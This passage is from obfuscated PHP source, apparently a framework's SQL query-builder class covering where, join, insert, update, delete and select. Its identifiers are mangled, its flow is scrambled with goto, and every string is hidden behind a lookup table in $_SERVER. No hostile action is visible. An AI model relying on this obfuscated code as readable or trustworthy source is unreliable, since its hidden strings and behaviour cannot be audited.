(!preg_match($C‡™£Ñ¢¦Ô[930], $eŞ™¸¹‹)) { think_exception($C‡™£Ñ¢¦Ô[931] . $eŞ™¸¹‹); } return $eŞ™¸¹‹; } protected function parseValue($BÏÖ‚î¢ãß) { $CÓ²¸Á§´× =& $_SERVER[¢ÌÛ]; if (is_string($BÏÖ‚î¢ãß)) { $BÏÖ‚î¢ãß = $CÓ²¸Á§´×[893] . $this->escapeString($BÏÖ‚î¢ãß) . $CÓ²¸Á§´×[893]; } elseif (isset($BÏÖ‚î¢ãß[0]) && is_string($BÏÖ‚î¢ãß[0]) && strtolower($BÏÖ‚î¢ãß[0]) == $CÓ²¸Á§´×[293]) { $BÏÖ‚î¢ãß = $this->escapeString($BÏÖ‚î¢ãß[1]); } elseif (is_array($BÏÖ‚î¢ãß)) { $BÏÖ‚î¢ãß = array_map(array($this, $CÓ²¸Á§´×[894]), $BÏÖ‚î¢ãß); } elseif (is_bool($BÏÖ‚î¢ãß)) { $BÏÖ‚î¢ãß = $BÏÖ‚î¢ãß ? $CÓ²¸Á§´×[86] : $CÓ²¸Á§´×[495]; } elseif (is_null($BÏÖ‚î¢ãß)) { $BÏÖ‚î¢ãß = $CÓ²¸Á§´×[102]; } return $BÏÖ‚î¢ãß; } protected function parseField($E›ñ¸ „…¿) { $e’«¿âÑ… =& $_SERVER[¢ÌÛ]; if (is_string($E›ñ¸ „…¿) && strpos($E›ñ¸ „…¿, $e’«¿âÑ…[47])) { $E›ñ¸ „…¿ = explode($e’«¿âÑ…[47], $E›ñ¸ „…¿); } if (is_array($E›ñ¸ „…¿)) { $BŸÍß¤ÔÔ• = array(); foreach ($E›ñ¸ „…¿ as $D—ù§åÔ½Ó => $d¸—¯ˆí¦“) { if (!is_numeric($D—ù§åÔ½Ó)) { $BŸÍß¤ÔÔ•[] = $this->parseKey($D—ù§åÔ½Ó) . $e’«¿âÑ…[932] . $this->parseKey($d¸—¯ˆí¦“); } else { $BŸÍß¤ÔÔ•[] = $this->parseKey($d¸—¯ˆí¦“); } } $B¼íñĞš¼¹ = implode($e’«¿âÑ…[47], $BŸÍß¤ÔÔ•); } elseif (is_string($E›ñ¸ „…¿) && !empty($E›ñ¸ „…¿)) { $B¼íñĞš¼¹ = $E›ñ¸ „…¿; } else { $B¼íñĞš¼¹ = $e’«¿âÑ…[182]; } return $B¼íñĞš¼¹; } protected function parseTable($aÀã®§ØÈç) { $BŸœŸç…… =& $_SERVER[¢ÌÛ]; if (is_array($aÀã®§ØÈç)) { $bê¾¨™Ä«Ç = array(); foreach ($aÀã®§ØÈç as $cÎÑ£ëÄÙí => $B®Šøé¹½¥) { if (!is_numeric($cÎÑ£ëÄÙí)) { $bê¾¨™Ä«Ç[] = $this->parseKey($cÎÑ£ëÄÙí) . $BŸœŸç……[50] . $this->parseKey($B®Šøé¹½¥); } else { $bê¾¨™Ä«Ç[] = $this->parseKey($cÎÑ£ëÄÙí); } } $aÀã®§ØÈç = $bê¾¨™Ä«Ç; } elseif (is_string($aÀã®§ØÈç)) { if (strstr($aÀã®§ØÈç, $BŸœŸç……[50])) { return $aÀã®§ØÈç; } $aÀã®§ØÈç = explode($BŸœŸç……[47], $aÀã®§ØÈç); array_walk($aÀã®§ØÈç, array($this, $BŸœŸç……[843])); } return $BŸœŸç……[837] . trim(implode($BŸœŸç……[933], $aÀã®§ØÈç), $BŸœŸç……[377]) . $BŸœŸç……[837]; } protected function parseWhere($AÅ–æ¬Ïè„) { $C·Ì½˜ÖêŞ =& $_SERVER[¢ÌÛ]; $eĞİ™ø”º¶ = $C·Ì½˜ÖêŞ[33]; if (is_string($AÅ–æ¬Ïè„)) { $eĞİ™ø”º¶ = $AÅ–æ¬Ïè„; } else { $e‰†—ÁŒ› = isset($AÅ–æ¬Ïè„[$C·Ì½˜ÖêŞ[934]]) ? strtoupper($AÅ–æ¬Ïè„[$C·Ì½˜ÖêŞ[934]]) : $C·Ì½˜ÖêŞ[33]; if (in_array($e‰†—ÁŒ›, array($C·Ì½˜ÖêŞ[935], $C·Ì½˜ÖêŞ[936], $C·Ì½˜ÖêŞ[937]))) { $e‰†—ÁŒ› = $C·Ì½˜ÖêŞ[50] . $e‰†—ÁŒ› . $C·Ì½˜ÖêŞ[50]; unset($AÅ–æ¬Ïè„[$C·Ì½˜ÖêŞ[934]]); } else { $e‰†—ÁŒ› = $C·Ì½˜ÖêŞ[938]; } foreach ($AÅ–æ¬Ïè„ as $B×ÎÙï²ºğ => $fòÆç”¡ö) { $eĞİ™ø”º¶ .= $C·Ì½˜ÖêŞ[273]; if (is_numeric($B×ÎÙï²ºğ)) { $B×ÎÙï²ºğ = $C·Ì½˜ÖêŞ[939]; } if (0 === strpos($B×ÎÙï²ºğ, $C·Ì½˜ÖêŞ[70])) { $eĞİ™ø”º¶ .= $this->parseThinkWhere($B×ÎÙï²ºğ, $fòÆç”¡ö); } else { if (!preg_match($C·Ì½˜ÖêŞ[940], trim($B×ÎÙï²ºğ))) { think_exception(think_lang($C·Ì½˜ÖêŞ[941]) . $C·Ì½˜ÖêŞ[4] . $B×ÎÙï²ºğ); } $C¸ã¼Àğá“ = is_array($fòÆç”¡ö) && isset($fòÆç”¡ö[$C·Ì½˜ÖêŞ[942]]); $B×ÎÙï²ºğ = trim($B×ÎÙï²ºğ); if (strpos($B×ÎÙï²ºğ, $C·Ì½˜ÖêŞ[279])) { $B§·‰·•†Ë = explode($C·Ì½˜ÖêŞ[279], $B×ÎÙï²ºğ); $FáÓêê¦Ÿ = array(); foreach ($B§·‰·•†Ë as $F¯œ‰Œæ => $FÇñãİùŠ¹) { $FÏÑÍ«ÒĞ = $C¸ã¼Àğá“ ? $fòÆç”¡ö[$F¯œ‰Œæ] : $fòÆç”¡ö; $FáÓêê¦Ÿ[] = $C·Ì½˜ÖêŞ[256] . $this->parseWhereItem($this->parseKey($FÇñãİùŠ¹), $FÏÑÍ«ÒĞ) . $C·Ì½˜ÖêŞ[842]; } $eĞİ™ø”º¶ .= implode($C·Ì½˜ÖêŞ[943], $FáÓêê¦Ÿ); } elseif (strpos($B×ÎÙï²ºğ, $C·Ì½˜ÖêŞ[280])) { $B§·‰·•†Ë = explode($C·Ì½˜ÖêŞ[280], $B×ÎÙï²ºğ); $FáÓêê¦Ÿ = array(); foreach ($B§·‰·•†Ë as $F¯œ‰Œæ => $FÇñãİùŠ¹) { $FÏÑÍ«ÒĞ = $C¸ã¼Àğá“ ? $fòÆç”¡ö[$F¯œ‰Œæ] : $fòÆç”¡ö; $FáÓêê¦Ÿ[] = $C·Ì½˜ÖêŞ[256] . $this->parseWhereItem($this->parseKey($FÇñãİùŠ¹), $FÏÑÍ«ÒĞ) . $C·Ì½˜ÖêŞ[842]; } $eĞİ™ø”º¶ .= implode($C·Ì½˜ÖêŞ[938], $FáÓêê¦Ÿ); } else { $eĞİ™ø”º¶ .= $this->parseWhereItem($this->parseKey($B×ÎÙï²ºğ), $fòÆç”¡ö); } } $eĞİ™ø”º¶ .= $C·Ì½˜ÖêŞ[274] . $e‰†—ÁŒ›; } $eĞİ™ø”º¶ = substr($eĞİ™ø”º¶, 0, -strlen($e‰†—ÁŒ›)); } return empty($eĞİ™ø”º¶) ? $C·Ì½˜ÖêŞ[33] : $C·Ì½˜ÖêŞ[944] . $eĞİ™ø”º¶; } protected function parseWhereItem($E‹œ¢¿Ş¹«, $föÛ™ÀÔŠ¬) { $C§³ğÙİã =& $_SERVER[¢ÌÛ]; $CŒ´¹¯´¿ä = $C§³ğÙİã[33]; if (is_array($föÛ™ÀÔŠ¬)) { if (is_string($föÛ™ÀÔŠ¬[0])) { $A˜°‚óÑØò = strtolower($föÛ™ÀÔŠ¬[0]); if (in_array($föÛ™ÀÔŠ¬[0], array($C§³ğÙİã[928], $C§³ğÙİã[945], $C§³ğÙİã[946], $C§³ğÙİã[947], $C§³ğÙİã[948], $C§³ğÙİã[949]))) { $CŒ´¹¯´¿ä .= $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $föÛ™ÀÔŠ¬[0] . $C§³ğÙİã[50] . $this->parseValue($föÛ™ÀÔŠ¬[1]); } elseif (preg_match($C§³ğÙİã[950], $föÛ™ÀÔŠ¬[0])) { $CŒ´¹¯´¿ä .= $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $this->exp[$A˜°‚óÑØò] . $C§³ğÙİã[50] . $this->parseValue($föÛ™ÀÔŠ¬[1]); } elseif (preg_match($C§³ğÙİã[951], $föÛ™ÀÔŠ¬[0])) { if (is_array($föÛ™ÀÔŠ¬[1])) { $fªŞ¢­¹³ = isset($föÛ™ÀÔŠ¬[2]) ? strtoupper($föÛ™ÀÔŠ¬[2]) : $C§³ğÙİã[936]; if (in_array($fªŞ¢­¹³, array($C§³ğÙİã[935], $C§³ğÙİã[936], $C§³ğÙİã[937]))) { $fˆùƒöÖÀ = array(); foreach ($föÛ™ÀÔŠ¬[1] as $dÎ«àİ¾¸) { $fˆùƒöÖÀ[] = $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $this->exp[$A˜°‚óÑØò] . $C§³ğÙİã[50] . $this->parseValue($dÎ«àİ¾¸); } $CŒ´¹¯´¿ä .= $C§³ğÙİã[256] . implode($C§³ğÙİã[50] . $fªŞ¢­¹³ . $C§³ğÙİã[50], $fˆùƒöÖÀ) . $C§³ğÙİã[842]; } } else { $CŒ´¹¯´¿ä .= $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $this->exp[$A˜°‚óÑØò] . $C§³ğÙİã[50] . $this->parseValue($föÛ™ÀÔŠ¬[1]); } } elseif ($C§³ğÙİã[293] == $A˜°‚óÑØò) { $CŒ´¹¯´¿ä .= $C§³ğÙİã[840] . $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $föÛ™ÀÔŠ¬[1] . $C§³ğÙİã[952]; } elseif (preg_match($C§³ğÙİã[953], $föÛ™ÀÔŠ¬[0])) { $CŒ´¹¯´¿ä .= $föÛ™ÀÔŠ¬[0]; } elseif (preg_match($C§³ğÙİã[954], $föÛ™ÀÔŠ¬[0])) { if (isset($föÛ™ÀÔŠ¬[2]) && $C§³ğÙİã[293] == $föÛ™ÀÔŠ¬[2]) { $CŒ´¹¯´¿ä .= $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $this->exp[$A˜°‚óÑØò] . $C§³ğÙİã[50] . $föÛ™ÀÔŠ¬[1]; } else { if (is_string($föÛ™ÀÔŠ¬[1])) { $föÛ™ÀÔŠ¬[1] = explode($C§³ğÙİã[47], $föÛ™ÀÔŠ¬[1]); } $Bš´Ø×£Œæ = implode($C§³ğÙİã[47], $this->parseValue($föÛ™ÀÔŠ¬[1])); $CŒ´¹¯´¿ä .= $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $this->exp[$A˜°‚óÑØò] . $C§³ğÙİã[840] . $Bš´Ø×£Œæ . $C§³ğÙİã[842]; } } elseif (preg_match($C§³ğÙİã[955], $föÛ™ÀÔŠ¬[0])) { $c¥¸¤±œÈÒ = is_string($föÛ™ÀÔŠ¬[1]) ? explode($C§³ğÙİã[47], $föÛ™ÀÔŠ¬[1]) : $föÛ™ÀÔŠ¬[1]; $CŒ´¹¯´¿ä .= $C§³ğÙİã[840] . $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $this->exp[$A˜°‚óÑØò] . $C§³ğÙİã[50] . $this->parseValue($c¥¸¤±œÈÒ[0]) . $C§³ğÙİã[938] . $this->parseValue($c¥¸¤±œÈÒ[1]) . $C§³ğÙİã[274]; } else { think_exception(think_lang($C§³ğÙİã[941]) . $C§³ğÙİã[4] . $föÛ™ÀÔŠ¬[0]); } } else { $b‰Ãà½ñ° = count($föÛ™ÀÔŠ¬); $EÚø§Ó‘ˆÂ = $C§³ğÙİã[33]; if (is_string($föÛ™ÀÔŠ¬[$b‰Ãà½ñ° - 1])) { $EÚø§Ó‘ˆÂ = isset($föÛ™ÀÔŠ¬[$b‰Ãà½ñ° - 1]) ? strtoupper($föÛ™ÀÔŠ¬[$b‰Ãà½ñ° - 1]) : $C§³ğÙİã[33]; if (in_array($EÚø§Ó‘ˆÂ, array($C§³ğÙİã[935], $C§³ğÙİã[936], $C§³ğÙİã[937]))) { $b‰Ãà½ñ° = $b‰Ãà½ñ° - 1; } } else { $EÚø§Ó‘ˆÂ = $C§³ğÙİã[935]; } for ($CŸõÜöÅÍÁ = 0; $CŸõÜöÅÍÁ < $b‰Ãà½ñ°; $CŸõÜöÅÍÁ++) { $c¥¸¤±œÈÒ = is_array($föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ]) ? $föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ][1] : $föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ]; if ($C§³ğÙİã[293] == strtolower($föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ][0])) { $CŒ´¹¯´¿ä .= $C§³ğÙİã[256] . $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $c¥¸¤±œÈÒ . $C§³ğÙİã[952] . $EÚø§Ó‘ˆÂ . $C§³ğÙİã[50]; } else { $eŒ”ÏÑì”– = is_array($föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ]) ? $this->exp[strtolower($föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ][0])] : $C§³ğÙİã[928]; if (!$eŒ”ÏÑì”– && is_array($föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ]) && in_array($föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ][0], array($C§³ğÙİã[928], $C§³ğÙİã[945], $C§³ğÙİã[946], $C§³ğÙİã[947], $C§³ğÙİã[948], $C§³ğÙİã[949]))) { $eŒ”ÏÑì”– = $föÛ™ÀÔŠ¬[$CŸõÜöÅÍÁ][0]; } $CŒ´¹¯´¿ä .= $C§³ğÙİã[256] . $E‹œ¢¿Ş¹« . $C§³ğÙİã[50] . $eŒ”ÏÑì”– . $C§³ğÙİã[50] . $this->parseValue($c¥¸¤±œÈÒ) . $C§³ğÙİã[952] . $EÚø§Ó‘ˆÂ . $C§³ğÙİã[50]; } } $CŒ´¹¯´¿ä = substr($CŒ´¹¯´¿ä, 0, -4); } } else { $CŒ´¹¯´¿ä .= $E‹œ¢¿Ş¹« . $C§³ğÙİã[956] . $this->parseValue($föÛ™ÀÔŠ¬); } return $CŒ´¹¯´¿ä; } protected function parseThinkWhere($dİÆĞÏ¬, $Eœ¢”¾ß») { $F¢¸æˆ¶ŒÏ =& $_SERVER[¢ÌÛ]; $a¢‘ƒ¥ƒ‚ = $F¢¸æˆ¶ŒÏ[33]; switch ($dİÆĞÏ¬) { case $F¢¸æˆ¶ŒÏ[348]: $a¢‘ƒ¥ƒ‚ = $Eœ¢”¾ß»; break; case $F¢¸æˆ¶ŒÏ[939]: $a¢‘ƒ¥ƒ‚ = is_string($Eœ¢”¾ß») ? $Eœ¢”¾ß» : substr($this->parseWhere($Eœ¢”¾ß»), 6); break; case $F¢¸æˆ¶ŒÏ[957]: parse_str($Eœ¢”¾ß», $AîĞóœù); if (isset($AîĞóœù[$F¢¸æˆ¶ŒÏ[934]])) { $cº’ÒíÔâ¶ = $F¢¸æˆ¶ŒÏ[50] . strtoupper($AîĞóœù[$F¢¸æˆ¶ŒÏ[934]]) . $F¢¸æˆ¶ŒÏ[50]; unset($AîĞóœù[$F¢¸æˆ¶ŒÏ[934]]); } else { $cº’ÒíÔâ¶ = $F¢¸æˆ¶ŒÏ[938]; } $A³˜Ö¢¾’ = array(); foreach ($AîĞóœù as $aÅ©¬–Ôß¦ => $D½à×™»—) { $A³˜Ö¢¾’[] = $this->parseKey($aÅ©¬–Ôß¦) . $F¢¸æˆ¶ŒÏ[956] . $this->parseValue($D½à×™»—); } $a¢‘ƒ¥ƒ‚ = implode($cº’ÒíÔâ¶, $A³˜Ö¢¾’); break; } return $a¢‘ƒ¥ƒ‚; } protected function parseLimit($AÊÁÖÂˆ¾Ô) { $A“È¬×Ø¤Ø =& $_SERVER[¢ÌÛ]; return !empty($AÊÁÖÂˆ¾Ô) ? $A“È¬×Ø¤Ø[48] . $AÊÁÖÂˆ¾Ô . $A“È¬×Ø¤Ø[50] : $A“È¬×Ø¤Ø[33]; } protected function parseJoin($a‹µà£ßˆ…) { $E•“‚¡…˜ó =& $_SERVER[¢ÌÛ]; $aèß©ºËä = $E•“‚¡…˜ó[33]; if (!empty($a‹µà£ßˆ…)) { if (is_array($a‹µà£ßˆ…)) { foreach ($a‹µà£ßˆ… as $Bå»­ó¾• => $AË„ŒÚëÛ¹) { if (!1 !== stripos($AË„ŒÚëÛ¹, $E•“‚¡…˜ó[958])) { $aèß©ºËä .= $E•“‚¡…˜ó[50] . $AË„ŒÚëÛ¹; } else { $aèß©ºËä .= $E•“‚¡…˜ó[959] . $AË„ŒÚëÛ¹; } } } else { $aèß©ºËä .= $E•“‚¡…˜ó[959] . $a‹µà£ßˆ…; } } $aèß©ºËä = preg_replace($E•“‚¡…˜ó[960], think_config($E•“‚¡…˜ó[866]) . $E•“‚¡…˜ó[961], $aèß©ºËä); return $aèß©ºËä; } protected function parseOrder($CÈ‚‘®Ó¢í) { $A‚¥ÇŠŞ—Ü =& $_SERVER[¢ÌÛ]; if (is_array($CÈ‚‘®Ó¢í)) { $cÊ¸Á‰õ«¥ = array(); foreach ($CÈ‚‘®Ó¢í as $fÉË‹•Ò¯° => $B”ÛÔŞöšß) { if (is_numeric($fÉË‹•Ò¯°)) { $cÊ¸Á‰õ«¥[] = $this->parseKey($B”ÛÔŞöšß); } else { $B”ÛÔŞöšß = in_array(strtoupper(trim($B”ÛÔŞöšß)), array($A‚¥ÇŠŞ—Ü[962], $A‚¥ÇŠŞ—Ü[963])) ? $A‚¥ÇŠŞ—Ü[50] . $B”ÛÔŞöšß : $A‚¥ÇŠŞ—Ü[33]; if (preg_match($A‚¥ÇŠŞ—Ü[964], $fÉË‹•Ò¯°)) { $cÊ¸Á‰õ«¥[] = $this->parseKey($fÉË‹•Ò¯°) . $B”ÛÔŞöšß; } else { think_exception($A‚¥ÇŠŞ—Ü[965] . $fÉË‹•Ò¯°); } } } $CÈ‚‘®Ó¢í = implode($A‚¥ÇŠŞ—Ü[47], $cÊ¸Á‰õ«¥); } return !empty($CÈ‚‘®Ó¢í) ? $A‚¥ÇŠŞ—Ü[966] . $CÈ‚‘®Ó¢í : $A‚¥ÇŠŞ—Ü[33]; } protected function parseGroup($C®‡†¨Ôˆ) { $c ƒùÔŒ§¸ =& $_SERVER[¢ÌÛ]; return !empty($C®‡†¨Ôˆ) ? $c ƒùÔŒ§¸[967] . $C®‡†¨Ôˆ : $c ƒùÔŒ§¸[33]; } protected function parseHaving($fÓ†Ïè”´) { $eõó§ä¼ÀÊ =& $_SERVER[¢ÌÛ]; return !empty($fÓ†Ïè”´) ? $eõó§ä¼ÀÊ[968] . $fÓ†Ïè”´ : $eõó§ä¼ÀÊ[33]; } protected function parseComment($fóÖÉÅÌÍÂ) { $fË¾ß®²‹  =& $_SERVER[¢ÌÛ]; return !empty($fóÖÉÅÌÍÂ) ? $fË¾ß®²‹ [969] . $fóÖÉÅÌÍÂ . $fË¾ß®²‹ [970] : $fË¾ß®²‹ [33]; } protected function parseDistinct($Fö’¬Ã®ŸÍ) { $cóÔ‰¸ë†‘ =& $_SERVER[¢ÌÛ]; return !empty($Fö’¬Ã®ŸÍ) ? $cóÔ‰¸ë†‘[971] : $cóÔ‰¸ë†‘[33]; } protected function parseUnion($eÓ­×¢±•) { $CéÆöàìØ =& $_SERVER[¢ÌÛ]; if (empty($eÓ­×¢±•)) { return $CéÆöàìØ[33]; } if (isset($eÓ­×¢±•[$CéÆöàìØ[344]])) { $BƒÊ¹È•“è = $CéÆöàìØ[972]; unset($eÓ­×¢±•[$CéÆöàìØ[344]]); } else { $BƒÊ¹È•“è = $CéÆöàìØ[973]; } foreach ($eÓ­×¢±• as $bˆÙ›œĞ£¬) { $a £ëĞ³õ[] = $BƒÊ¹È•“è . (is_array($bˆÙ›œĞ£¬) ? $this->buildSelectSql($bˆÙ›œĞ£¬) : $bˆÙ›œĞ£¬); } return implode($CéÆöàìØ[50], $a £ëĞ³õ); } public function insert($E†£ÒÁ…‹, $d Ö¿İ‘®˜ = array(), $cÂÅí®Ï˜” = false) { goto eµ¡¬ŞÉ•; bÕ‰†Í±‚: foreach ($E†£ÒÁ…‹ as $f¶é±îˆ®… => $BìÉóšä™) { if (is_array($BìÉóšä™) && $dˆ÷‘ß««Ü[293] == $BìÉóšä™[0]) { $eØ‚ƒŒ£÷[] = $this->parseKey($f¶é±îˆ®…); $Bê•Õ„–Ú[] = $BìÉóšä™[1]; } elseif (is_scalar($BìÉóšä™) || is_null($BìÉóšä™)) { $eØ‚ƒŒ£÷[] = $this->parseKey($f¶é±îˆ®…); $Bê•Õ„–Ú[] = $this->parseValue($BìÉóšä™); } } $B Á´†ä½ = ($cÂÅí®Ï˜” ? $dˆ÷‘ß««Ü[844] : $dˆ÷‘ß««Ü[845]) . $dˆ÷‘ß««Ü[846] . $this->parseTable($d Ö¿İ‘®˜[$dˆ÷‘ß««Ü[275]]) . $dˆ÷‘ß««Ü[840] . implode($dˆ÷‘ß««Ü[47], $eØ‚ƒŒ£÷) . $dˆ÷‘ß««Ü[841] . implode($dˆ÷‘ß««Ü[47], $Bê•Õ„–Ú) . $dˆ÷‘ß««Ü[842]; $B Á´†ä½ .= $this->parseLock(isset($d Ö¿İ‘®˜[$dˆ÷‘ß««Ü[796]]) ? $d Ö¿İ‘®˜[$dˆ÷‘ß««Ü[796]] : !1); goto CÌİ¡•š¶í; eµ¡¬ŞÉ•: $dˆ÷‘ß««Ü =& $_SERVER[¢ÌÛ]; $Bê•Õ„–Ú = $eØ‚ƒŒ£÷ = array(); $this->model = $d Ö¿İ‘®˜[$dˆ÷‘ß««Ü[277]]; goto bÕ‰†Í±‚; CÌİ¡•š¶í: $B Á´†ä½ .= $this->parseComment(!empty($d Ö¿İ‘®˜[$dˆ÷‘ß««Ü[350]]) ? $d Ö¿İ‘®˜[$dˆ÷‘ß««Ü[350]] : $dˆ÷‘ß««Ü[33]); return $this->execute($B Á´†ä½, $this->parseBind(!empty($d Ö¿İ‘®˜[$dˆ÷‘ß««Ü[281]]) ? $d Ö¿İ‘®˜[$dˆ÷‘ß««Ü[281]] : array())); goto B•¢¯ó‡Á‚; B•¢¯ó‡Á‚: } public function selectInsert($C‰ìµ¸ÔÀä, $b÷‘•”ÇñÆ, $bôŞ‰¡‰× = array()) { goto aÚ¬ÉØ’”ñ; aé–ÒŠµ‹: array_walk($C‰ìµ¸ÔÀä, array($this, $AÁÎ…¨É¯­[843])); $f‘¦óœ¤Ñá = $AÁÎ…¨É¯­[974] . $this->parseTable($b÷‘•”ÇñÆ) . $AÁÎ…¨É¯­[840] . implode($AÁÎ…¨É¯­[47], $C‰ìµ¸ÔÀä) . $AÁÎ…¨É¯­[952]; $f‘¦óœ¤Ñá .= $this->buildSelectSql($bôŞ‰¡‰×); goto Aß×‰ƒŠ†î; aÚ¬ÉØ’”ñ: $AÁÎ…¨É¯­ =& $_SERVER[¢ÌÛ]; $this->model = $bôŞ‰¡‰×[$AÁÎ…¨É¯­[277]]; if (is_string($C‰ìµ¸ÔÀä)) { $C‰ìµ¸ÔÀä = explode($AÁÎ…¨É¯­[47], $C‰ìµ¸ÔÀä); } goto aé–ÒŠµ‹; Aß×‰ƒŠ†î: return $this->execute($f‘¦óœ¤Ñá, $this->parseBind(!empty($bôŞ‰¡‰×[$AÁÎ…¨É¯­[281]]) ? $bôŞ‰¡‰×[$AÁÎ…¨É¯­[281]] : array())); goto AĞªªÂÅ‚ß; AĞªªÂÅ‚ß: } public function update($C‘ŞÃë†îÆ, $F«‹ÙÁšğ) { $Añ¡–Ã†ˆâ =& $_SERVER[¢ÌÛ]; $this->model = $F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[277]]; $c‘È…Ğ„ = $Añ¡–Ã†ˆâ[975] . $this->parseTable($F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[275]]) . $this->parseSet($C‘ŞÃë†îÆ) . $this->parseWhere(!empty($F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[271]]) ? $F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[271]] : $Añ¡–Ã†ˆâ[33]) . $this->parseOrder(!empty($F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[359]]) ? $F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[359]] : $Añ¡–Ã†ˆâ[33]) . $this->parseLimit(!empty($F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[288]]) ? $F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[288]] : $Añ¡–Ã†ˆâ[33]) . $this->parseLock(isset($F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[796]]) ? $F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[796]] : !1) . $this->parseComment(!empty($F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[350]]) ? $F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[350]] : $Añ¡–Ã†ˆâ[33]); return $this->execute($c‘È…Ğ„, $this->parseBind(!empty($F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[281]]) ? $F«‹ÙÁšğ[$Añ¡–Ã†ˆâ[281]] : array())); } public function delete($eÕ¿Í¹ç’Õ = array()) { $D»ÒäÕ¢ÕÚ =& $_SERVER[¢ÌÛ]; $this->model = $eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[277]]; $E¶Î–¥ã¯â = $D»ÒäÕ¢ÕÚ[976] . $this->parseTable($eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[275]]) . $this->parseWhere(!empty($eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[271]]) ? $eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[271]] : $D»ÒäÕ¢ÕÚ[33]) . $this->parseOrder(!empty($eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[359]]) ? $eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[359]] : $D»ÒäÕ¢ÕÚ[33]) . $this->parseLimit(!empty($eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[288]]) ? $eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[288]] : $D»ÒäÕ¢ÕÚ[33]) . $this->parseLock(isset($eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[796]]) ? $eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[796]] : !1) . $this->parseComment(!empty($eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[350]]) ? $eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[350]] : $D»ÒäÕ¢ÕÚ[33]); return $this->execute($E¶Î–¥ã¯â, $this->parseBind(!empty($eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[281]]) ? $eÕ¿Í¹ç’Õ[$D»ÒäÕ¢ÕÚ[281]] : array())); } public function select($F£ÔËŸŒä‚ = array()) { goto fô©íË¤; EÌ¾›æ¡‘: if ($c›š„ã° && !1 !== $CÜìñç‹±•) { think_cache($Eù°ŞÏİßÚ, $CÜìñç‹±•, $c›š„ã°); } return $CÜìñç‹±•; goto fïŸéÌ„¡; A¦Ç´½è×: $c›š„ã° = isset($F£ÔËŸŒä‚[$a·‰ô·ºĞ[345]]) ? $F£ÔËŸŒä‚[$a·‰ô·ºĞ[345]] : !1; if ($c›š„ã°) { $Eù°ŞÏİßÚ = is_string($c›š„ã°[$a·‰ô·ºĞ[92]]) ? $c›š„ã°[$a·‰ô·ºĞ[92]] : $a·‰ô·ºĞ[977] . md5($A×Š„íòºŒ); $cÕ¨×²—« = think_cache($Eù°ŞÏİßÚ, $a·‰ô·ºĞ[33], $c›š„ã°); if (!1 !== $cÕ¨×²—«) { return $cÕ¨×²—«; } } $CÜìñç‹±• = $this->query($A×Š„íòºŒ, $this->parseBind(!empty($F£ÔËŸŒä‚[$a·‰ô·ºĞ[281]]) ? $F£ÔËŸŒä‚[$a·‰ô·ºĞ[281]] : array())); goto EÌ¾›æ¡‘; fô©íË¤: $a·‰ô·ºĞ =& $_SERVER[¢ÌÛ]; $this->model = $F£ÔËŸŒä‚[$a·‰ô·ºĞ[277]]; $A×Š„íòºŒ = $this->buildSelectSql($F£ÔËŸŒä‚); goto A¦Ç´½è×; fïŸéÌ„¡: } public function buildSelectSql($Bİº¸•Ÿ± = array()) { goto d´›ÍßÕî±; F®ÈÅ‚îºÒ: $DÆ­Ü‰éÓ = $this->parseSql($this->selectSql, $Bİº¸•Ÿ±); $DÆ­Ü‰éÓ .= $this->parseLock(isset($Bİº¸•Ÿ±[$bÀ¾…”äÎ„[796]]) ? $Bİº¸•Ÿ±[$bÀ¾…”äÎ„[796]] : !1); if (isset($aˆ¿¤¡ó§Ê)) { think_cache($aˆ¿¤¡ó§Ê, $DÆ­Ü‰éÓ); } goto a†³ŸÅÑ”¨; a†³ŸÅÑ”¨: return $DÆ­Ü‰éÓ; goto b³Ïí¦¶»Ğ; d´›ÍßÕî±: $bÀ¾…”äÎ„ =& $_SERVER[¢ÌÛ]; if (isset($Bİº¸•Ÿ±[$bÀ¾…”äÎ„[349]])) { if (strpos($Bİº¸•Ÿ±[$bÀ¾…”äÎ„[349]], $bÀ¾…”äÎ„[47])) { list($DàëÆ„ÖÆ, $E»¸ï’Ê¦’) = explode($bÀ¾…”äÎ„[47], $Bİº¸•Ÿ±[$bÀ¾…”äÎ„[349]]); } else { $DàëÆ„ÖÆ = $Bİº¸•Ÿ±[$bÀ¾…”äÎ„[349]]; } 